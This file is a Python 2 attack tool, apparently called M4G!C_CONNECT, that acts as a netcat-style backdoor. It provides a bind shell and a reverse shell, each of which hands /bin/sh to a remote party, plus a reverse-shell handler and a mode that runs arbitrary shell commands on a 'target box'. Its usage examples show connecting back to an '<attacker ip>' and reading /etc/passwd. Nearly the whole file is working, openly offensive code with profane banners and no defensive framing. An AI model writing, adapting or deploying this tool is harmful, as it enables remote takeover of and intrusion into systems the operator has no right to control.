import os,sys,socket,argparse,subprocess
import threading



class Option():
    def __init__(self):
        self.test = 4
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server = "0.0.0.0"

    def listen(self,port,bs,exe,rsh):
        try:
            self.s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            self.s.bind((self.server,port))
            self.s.listen(5)
            print("Listening On port {0} ".format(port))
        except Exception as e:
            sys.exit('[!] Error: {0}'.format(e))

        if bs == None and exe == None:
            while True:
                try:
                    client, address = self.s.accept()
                    client_handler = threading.Thread(target=self.client_handle,args=(client,))
                    client_handler.start()
                except Exception as e:
                    sys.exit('[!] Error : {0}'.format(e))
        elif bs == 1:
            try:
                client,address = self.s.accept()
                client.send("[+] Welcome From My Fucking Shell Bro :v Fuck You\r\n")
                client_thrad = threading.Thread(target=self.bind_shell,args=(client,))
                client_thrad.start()
            except Exception as e:
                sys.exit('[!] Error: {0}'.format(e))
        elif exe != None:
            try:
                client,addr = self.s.accept()
                self.run_command(client=client,command=exe)
            except Exception as e:
                sys.exit('[!] Error : {0} '.format(e))
        elif rsh == 1:
            try:
                client,address = self.s.accept()
                print "You are in M4G!C REVERSE_SHELL :v"
                client_thrad=threading.Thread(target=self.rs_handler,args=(client,))
                client_thrad.start()
            except Exception as e:
                sys.exit("[!] Error : {0}".format(e))



    def client_handle(self,client):
        while True:
            try:
                req = client.recv(2048)
                print(req)
                client.send(raw_input(""))
            except KeyboardInterrupt:
                sys.exit(1)



    def rs_handler(self,client):
        while True:
            cmd = raw_input("")+'\n'
            client.sendall(cmd)
            sys.stdout.write(client.recv(204800))

    def bind_shell(self,client):
        os.dup2(client.fileno(),0)
        os.dup2(client.fileno(),1)
        os.dup2(client.fileno(),2)
        res = subprocess.call(['/bin/sh','-i'])




    def reverse_shell(self,server,port):
        try :
            self.s.connect((server,port))
            os.dup2(self.s.fileno(),0)
            os.dup2(self.s.fileno(),1)
            os.dup2(self.s.fileno(),2)
            res = subprocess.call(['/bin/sh','-i'])
        except Exception as e:
            sys.exit("[!] Error : {0} ".format(e))


    def run_command(self,client,command):
        command = command.rstrip()
        try:
            res = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
            client.send(res)
            self.s.close()
        except Exception as e:
            sys.exit('[!] Error: {0}'.format(e))


    def connect_server(self,server,port):
        self.s.connect((server,port))
        while True:
            cmd = raw_input("")
            if cmd == 'exit' or cmd == 'quit':
                self.s.close()
                break
            else:
                self.s.sendall(cmd +'\n')
                sys.stdout.write(self.s.recv(204800))


o = Option()




def __init__():
    usage = '''usage: %(prog)s [-t target_box] [-l listening_mode] [-p port] [-bs get_bindshell] [-rs get_reverseshell] [-e excute_command] [-u upload]'''
    praser = argparse.ArgumentParser(usage=usage)
    praser.add_argument("-t","--target",type=str,help="Ip address of the target box to connect",action="store",dest="target")
    praser.add_argument("-l","--listen",action="store_const",dest="listening",const=1,help="Start The Listening Server For Backconnect")
    praser.add_argument("-p","--port",type=int,help="The port to listen or to connect to the attacker box",dest="port")
    praser.add_argument("-bs","--bin_shell",action="store_const",const=1,dest="bind_shell",help="spawn a bind shell on target box")
    praser.add_argument("-rs","--reverse_shell",action="store_const",const=1,dest="reverse_shell",help="spawn a backconnect reverse shell")
    praser.add_argument("-e","--execute",type=str,help="Execute a command on target box",dest="execute",action="store")
    praser.add_argument("-u","--upload",type=str,help="Upload a file to target box",dest="upload_file",action="store")
    praser.add_argument("-rsh","--reverse_shell_handler",action="store_const",const=1,dest="rsh",help="Setup Reverse Shell handler")
    praser.add_argument("--version",action="version",version="%(prog)s 0.1 beta")
    args = praser.parse_args()


    target = args.target
    listen = args.listening
    port   = args.port
    bs     = args.bind_shell
    rs     = args.reverse_shell
    exe    = args.execute
    upload = args.upload_file
    rsh    = args.rsh

    if len(sys.argv) == 1:
        praser.print_help()
        print("Eg:M4G!C_CONNECT.py -l -p 444")
        print("Eg:M4G!C_CONNECT.py -t 19.168.43.1 -p 4444")
        print("Eg:M4G!C_CONNECT.py -bs -p 666 ")
        print("Eg:M4G!C_CONNECT.py -rs -t <attacker ip> -p <attacker_port>")
        print("Eg:M4G!C_CONNECt.py -l -p 444 -e 'cat /etc/passwd'")

    if listen == 1:
        if port == None:
            sys.exit("[!] Listening mode required port no!!")
        else:
            o.listen(port,bs=bs,exe=exe,rsh=rsh)
            sys.exit(0)
    if rs == 1:
        if target == None:
            sys.exit("[!] Reverse shell require attacker ip to connect !!")
        elif port == None:
            sys.exit("[!] Reverse shell require attacker port to connect !!")
        else:
            o.reverse_shell(server=target,port=port)
            sys.exit(0)
    if target != None:
        if port != None:
            o.connect_server(target,port)




__init__()
